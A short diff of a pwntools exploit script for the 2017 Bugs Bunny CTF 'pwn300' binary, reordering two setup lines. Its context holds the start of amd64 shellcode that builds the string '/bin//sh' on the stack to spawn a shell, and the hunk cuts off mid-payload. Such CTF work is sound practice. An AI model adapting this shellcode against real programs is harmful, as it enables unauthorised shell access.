@@ -1,9 +1,8 @@
 # 2017 bugs_bunny_ctf
 from pwn import *
 
-r = process('./pwn300')
 e = ELF('./pwn300')
-
+r = process('./pwn300')
 context.arch = 'amd64'
 payload = ''
 payload += asm('push rbx; pushw 0x6873; pushw 0x2f2f; pushw 0x6e69; pushw 0x622f; push rsp; pop rdi')
